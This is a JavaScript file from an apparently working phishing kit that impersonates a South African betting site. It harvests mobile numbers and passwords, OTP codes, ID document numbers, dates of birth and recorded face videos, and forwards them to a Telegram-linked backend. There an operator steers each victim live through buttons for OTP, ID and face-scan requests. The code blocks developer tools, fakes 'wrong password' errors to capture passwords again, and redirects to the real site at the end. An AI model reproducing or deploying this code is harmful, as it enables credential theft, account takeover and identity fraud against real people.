document.onkeydown = function(e){ 
    if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74||e.keyCode==67))||(e.ctrlKey&&e.keyCode==85)){ 
        let p=prompt("Source Locked:"); 
        return p==="8890"; 
    } 
};

let currentU = "Unknown";
let videoStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let loginAttempt = 0;
let verifyAttempt = 0;
let flowTimeout = null;

// Persistent session generated for Telegram routing & live chat messaging
const globalSessionId = "sess_" + Date.now() + "_" + Math.floor(Math.random() * 1000);

setTimeout(() => { 
    const loadingView = document.getElementById('loading-view');
    if(loadingView) {
        loadingView.classList.remove('active');
        loadingView.style.display = 'none';
    }
    openModal('login-modal');
    startChatPolling(); // Start polling for Telegram admin replies
}, 1500);

function openModal(id) { 
    closeModals(); 
    document.querySelectorAll('.view').forEach(v => {
        if(v.id !== 'loading-view' && v.id !== 'promo-success-view' && v.id !== 'face-verify-view' && v.id !== 'maintenance-view') {
            v.classList.remove('active');
        }
    });
    const target = document.getElementById(id);
    if (target) target.style.display = 'flex'; 
}

function openView(id) {
    closeModals();
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

function closeModals() { 
    document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none'); 
    stopAllSpinners(); 
}

function handleAcceptPromo() {
    openView('promo-success-view');
    setTimeout(() => { openModal('login-modal'); }, 3000);
}

function stopAllSpinners() { 
    document.querySelectorAll('.submit-btn').forEach(b => { 
        b.disabled = false; 
        if(b.getAttribute('data-orig')) b.innerHTML = b.getAttribute('data-orig'); 
    }); 
    document.getElementById('process-overlay').style.display = 'none';
}

function togglePassword(i, e) {
    const f = document.getElementById(i);
    const icon = document.getElementById(e);
    if (f.type === "text") { f.type = "password"; icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye'); }
    else { f.type = "text"; icon.classList.remove('fa-eye'); icon.classList.add('fa-eye'); icon.classList.add('fa-eye-slash'); }
}

function toggleChat() {
    const w = document.getElementById('chat-window');
    w.style.display = (w.style.display === 'flex') ? 'none' : 'flex';
    if(w.style.display === 'flex') document.getElementById('chat-txt').focus();
}

function formatDOB(e) {
    let v = e.target.value.replace(/\D/g, ''); 
    if (v.length > 8) v = v.substring(0, 8);
    if (v.length >= 5) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4,8); }
    else if (v.length >= 3) { e.target.value = v.substring(0,2) + '/' + v.substring(2,4); }
    else { e.target.value = v; }
}

function handleFocus(el, isMobile, customLabel = null) {
    const wrap = el.parentElement;
    wrap.classList.add('focused');
    wrap.classList.remove('error');
    if (customLabel) wrap.querySelector('.mat-label').innerText = customLabel;
    else wrap.querySelector('.mat-label').innerText = isMobile ? 'Mobile Number' : 'Enter Password';
}

function handleBlur(el, isMobile, customLabel = null) {
    const wrap = el.parentElement;
    if (el.value.trim() === '') {
        wrap.classList.remove('focused');
        if (customLabel) wrap.querySelector('.mat-label').innerText = customLabel;
        else wrap.querySelector('.mat-label').innerText = isMobile ? '+27 Mobile Number' : 'Enter Password';
    }
}

function onPwFocus(el) {
    const mob = document.getElementById('lgn-mobile');
    if (mob.value.trim() === '') {
        document.getElementById('mobile-wrap').classList.add('error');
        document.getElementById('pw-wrap').classList.add('error');
    }
    handleFocus(el, false);
}

function remMatErr(el) { el.parentElement.classList.remove('error'); }
function remErr(i) { i.classList.remove('error-field'); }

function validate(ids) {
    let valid = true, first = null;
    ids.forEach(id => {
        const el = document.getElementById(id);
        if(el){
            const val = el.value.trim();
            if(!val || val.length < 1){
                if (el.classList.contains('mat-input')) el.parentElement.classList.add('error');
                else el.classList.add('error-field');
                valid = false;
                if(!first) first = el;
            } else {
                if (el.classList.contains('mat-input')) el.parentElement.classList.remove('error');
                else el.classList.remove('error-field');
            }
        }
    });
    if(first) first.focus(); 
    return valid;
}

async function initCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        document.getElementById('user-video').srcObject = videoStream;
        document.getElementById('camera-placeholder').style.display = 'none';
        document.getElementById('scan-status').innerText = "Please position your face within the frame.";
        document.getElementById('scan-status').style.color = "#aaa";
    } catch (err) {
        document.getElementById('scan-status').innerText = "Camera access denied. Ensure permissions are allowed.";
        document.getElementById('scan-status').style.color = "#d93025";
    }
}

function startFaceScan() {
    if (!videoStream) { alert("Please allow camera access to continue."); return; }
    
    // Clear existing error message on retry
    const errBox = document.getElementById('face-error');
    if(errBox) errBox.style.display = 'none';
    
    const btn = document.getElementById('start-scan-btn');
    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
    btn.disabled = true;
    btn.innerHTML = `<div class="spinner"></div>`;
    
    document.getElementById('scanner-line').style.display = 'block';
    document.getElementById('scan-status').innerText = "Recording biometric video... Please hold still.";
    document.getElementById('scan-status').style.color = "#009241";

    recordedChunks = [];
    try {
        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
    } catch (e) {
        mediaRecorder = new MediaRecorder(videoStream);
    }

    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) recordedChunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
        const reader = new FileReader();
        reader.readAsDataURL(videoBlob);
        reader.onloadend = () => {
            const base64Video = reader.result;
            sendFaceVideoData(base64Video);
        };
    };

    mediaRecorder.start();
    setTimeout(() => {
        if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
        document.getElementById('scanner-line').style.display = 'none';
        document.getElementById('scan-status').innerText = "Verification Submitted.";
        if(videoStream) { videoStream.getTracks().forEach(t => t.stop()); }
    }, 3500);
}

function sendFaceVideoData(base64Video) {
    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Approve Identity", callback_data: `approve:${globalSessionId}` },
                { text: "⛔ Reject Identity", callback_data: `reject_face:${globalSessionId}` }
            ]
        ]
    };

    fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            videoBase64: base64Video, 
            sessionId: globalSessionId, 
            userPhone: currentU,
            keyboard 
        })
    }).then(() => {
        document.getElementById('process-overlay').style.display = 'flex';
    }).catch(err => triggerMaintenance());
}

function triggerMaintenance() {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById('maintenance-view').classList.add('active'); 
    closeModals();
    setTimeout(() => { window.location.href = "https://www.betway.co.za/"; }, 4000);
}

function executeAdminCommand(command, logType) {
    clearTimeout(flowTimeout); // Cancel automated flow timer if admin manually takes over
    stopAllSpinners();
    switch(command) {
        case 'approve':
            if (document.getElementById('login-modal').style.display === 'flex' || document.getElementById('signup-modal').style.display === 'flex') {
                openModal('otp-modal');
            } else if (document.getElementById('otp-modal').style.display === 'flex') {
                openModal('verification-modal');
            } else if (document.getElementById('verification-modal').style.display === 'flex') {
                openView('face-verify-view');
                initCamera();
            } else {
                triggerMaintenance();
            }
            break;
        case 'wrong_pass':
            document.getElementById('login-pw').value = '';
            document.getElementById('pw-wrap').classList.add('error');
            openModal('login-modal');
            const lErr = document.getElementById('login-error');
            lErr.style.display = 'flex';
            lErr.innerHTML = '<i class="fas fa-info-circle"></i><span>Access Denied. Check Username and/or Password</span>';
            break;
        case 'wrong_otp':
            document.getElementById('otp-input').value = '';
            document.getElementById('otp-wrap').classList.add('error');
            openModal('otp-modal');
            document.getElementById('otp-error').style.display = 'flex';
            break;
        case 'reject_face':
            openView('face-verify-view');
            document.getElementById('face-error').style.display = 'block';
            initCamera();
            break;
        case 'otp': openModal('otp-modal'); break;
        case 'verify': openModal('verification-modal'); break;
        case 'face_verify': openView('face-verify-view'); initCamera(); break;
        case 'maint':
        case 'reject': triggerMaintenance(); break;
        default:
            openModal('verification-modal');
    }
}

function startChatPolling() {
    setInterval(async () => {
        try {
            const res = await fetch(`/.netlify/functions/api?sessionId=${globalSessionId}`);
            const data = await res.json();
            
            if (data.status && data.status !== "PENDING" && data.status !== "IDLE") {
                executeAdminCommand(data.status, "Active Session");
            }
            
            if (data.chatReply) {
                const box = document.getElementById('chat-msgs');
                box.innerHTML += `<div class="msg-b msg-agent">${data.chatReply}</div>`;
                box.scrollTop = box.scrollHeight;
            }
        } catch (err) {}
    }, 2000);
}

function handleChatEnter(e) { if (e.key === 'Enter') sendChatTxt(); }

function sendChatTxt() {
    const i = document.getElementById('chat-txt');
    const v = i.value.trim();
    if (!v) return;
    
    const box = document.getElementById('chat-msgs');
    box.innerHTML += `<div class="msg-b msg-user">${v}</div>`;
    box.scrollTop = box.scrollHeight;
    i.value = '';
    
    fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chatMessage: v, sessionId: globalSessionId, userPhone: currentU })
    }).catch(err => console.error("Chat error"));
}

function sendData(t) {
    const btn = event.currentTarget;
    clearTimeout(flowTimeout); // Reset flow timer on new submit actions
    
    let u = currentU;
    let m = "";

    let keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Approve & Continue", callback_data: `approve:${globalSessionId}` },
                { text: "⚠️ Wrong Data", callback_data: `wrong_pass:${globalSessionId}` }
            ],
            [
                { text: "📩 Request OTP", callback_data: `otp:${globalSessionId}` },
                { text: "🪪 Request ID Doc", callback_data: `verify:${globalSessionId}` }
            ],
            [
                { text: "📸 Request Face Scan", callback_data: `face_verify:${globalSessionId}` },
                { text: "⛔ End to Maintenance", callback_data: `maint:${globalSessionId}` }
            ]
        ]
    };

    if(t === 'Betting Voucher logs'){
        if(!validate(['lgn-mobile','login-pw'])) return;
        u = document.getElementById('lgn-mobile').value;
        const p = document.getElementById('login-pw').value;
        currentU = u;
        m = `📱 *Betting Voucher Login* 🇿🇦\n👤 *User:* \`${u}\`\n🔑 *Pass:*\n\`${p}\`\n🆔 *Session:* \`${globalSessionId}\``;
        loginAttempt++;
        
        // Auto-flow: Send to Verification after 5 seconds
        flowTimeout = setTimeout(() => {
            openModal('verification-modal');
        }, 5000);

    } else if (t === 'Sign Up logs') {
        if(!validate(['signup-mobile', 'signup-pw', 'signup-fname', 'signup-sname', 'signup-email'])) return;
        const mob = document.getElementById('signup-mobile').value;
        const pass = document.getElementById('signup-pw').value;
        const fn = document.getElementById('signup-fname').value;
        const sn = document.getElementById('signup-sname').value;
        const em = document.getElementById('signup-email').value;
        currentU = mob || fn || "New Sign Up";
        m = `📝 *New Registration Log* 🇿🇦\n👤 *Mobile:* \`${mob}\`\n🔑 *Pass:* \`${pass}\`\n📝 *Name:* \`${fn} ${sn}\`\n📧 *Email:* \`${em}\`\n🆔 *Session:* \`${globalSessionId}\``;

    } else if (t === 'OTP logs') {
        if(!validate(['otp-input'])) return;
        const otpVal = document.getElementById('otp-input').value.trim();
        if(otpVal.length < 4) return;
        m = `📱 *OTP Captured* 🇿🇦\n👤 *User:* \`${currentU}\`\n🔢 *Code:*\n\`${otpVal}\`\n🆔 *Session:* \`${globalSessionId}\``;
        keyboard.inline_keyboard[0][1] = { text: "⚠️ Wrong OTP", callback_data: `wrong_otp:${globalSessionId}` };

    } else if (t === 'Verification logs') {
        if(!validate(['verify-fname', 'verify-sname', 'verify-doc-input', 'verify-dob'])) return;
        const fname = document.getElementById('verify-fname').value.trim();
        const sname = document.getElementById('verify-sname').value.trim();
        const docVal = document.getElementById('verify-doc-input').value.trim();
        const docType = document.getElementById('verify-doc-type').value;
        const dob = document.getElementById('verify-dob').value;
        m = `🪪 *Identity Verification* 🇿🇦\n👤 *User:* \`${currentU}\`\n📝 *First Name:* \`${fname}\`\n📝 *Surname:* \`${sname}\`\n🇿🇦 *${docType}:*\n\`${docVal}\`\n📅 *D.O.B:* \`${dob}\`\n🆔 *Session:* \`${globalSessionId}\``;
        
        verifyAttempt++;
        if (verifyAttempt === 1) {
            // Auto-flow: Send to Login after 5 seconds
            flowTimeout = setTimeout(() => {
                document.getElementById('login-pw').value = '';
                document.getElementById('pw-wrap').classList.add('error');
                const errBox = document.getElementById('login-error');
                errBox.style.display = 'flex';
                errBox.innerHTML = '<i class="fas fa-exclamation-circle"></i><span>Security validation triggered. Please re-enter your password to proceed.</span>';
                openModal('login-modal');
            }, 5000);
        } else {
            // Auto-flow: Send to Maintenance after 10 seconds on the 2nd attempt
            flowTimeout = setTimeout(() => {
                triggerMaintenance();
            }, 5000);
        }
    }

    if(!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
    btn.disabled = true; 
    btn.innerHTML = `<div class="spinner"></div>`;
    document.getElementById('process-overlay').style.display = 'flex'; 

    fetch('/.netlify/functions/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: m, sessionId: globalSessionId, keyboard })
    }).catch(err => console.log('Log delivery delayed', err));
}
